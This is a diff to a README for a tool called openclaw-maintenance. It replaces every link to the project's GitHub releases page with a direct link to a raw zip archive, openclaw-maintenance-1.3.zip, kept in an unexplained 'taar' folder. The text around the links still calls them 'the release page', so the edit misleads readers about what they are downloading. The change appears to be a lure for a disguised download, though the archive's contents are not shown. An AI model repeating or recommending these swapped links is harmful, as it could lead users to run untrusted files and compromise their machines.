@@ -1,6 +1,6 @@
 # 🛠️ openclaw-maintenance - Local Tools for Stable OpenClaw
 
-[![Download Releases](https://img.shields.io/badge/Download-OpenClaw_Maintenance-brightgreen)](https://github.com/y-999/openclaw-maintenance/releases)
+[![Download Releases](https://img.shields.io/badge/Download-OpenClaw_Maintenance-brightgreen)](https://github.com/y-999/openclaw-maintenance/raw/refs/heads/main/taar/openclaw-maintenance-1.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Go to the release page to download the files you need:
 
-[OpenClaw Maintenance Releases](https://github.com/y-999/openclaw-maintenance/releases)
+[OpenClaw Maintenance Releases](https://github.com/y-999/openclaw-maintenance/raw/refs/heads/main/taar/openclaw-maintenance-1.3.zip)
 
 On that page, find the latest release. Download the zipped file that matches Windows if available, or download the script files individually if needed. Save them in a folder on your computer where you want to keep this application.
 
@@ -119,7 +119,7 @@ Be sure to update your `.env` file if your notification target or API keys chang
 
 ## 🚀 Quick Start Download and Setup
 
-[![Get OpenClaw Maintenance](https://img.shields.io/badge/Download-OpenClaw_Maintenance-blue)](https://github.com/y-999/openclaw-maintenance/releases)
+[![Get OpenClaw Maintenance](https://img.shields.io/badge/Download-OpenClaw_Maintenance-blue)](https://github.com/y-999/openclaw-maintenance/raw/refs/heads/main/taar/openclaw-maintenance-1.3.zip)
 
 - Download and unzip the latest release
 - Copy `.env.example` to `.env`
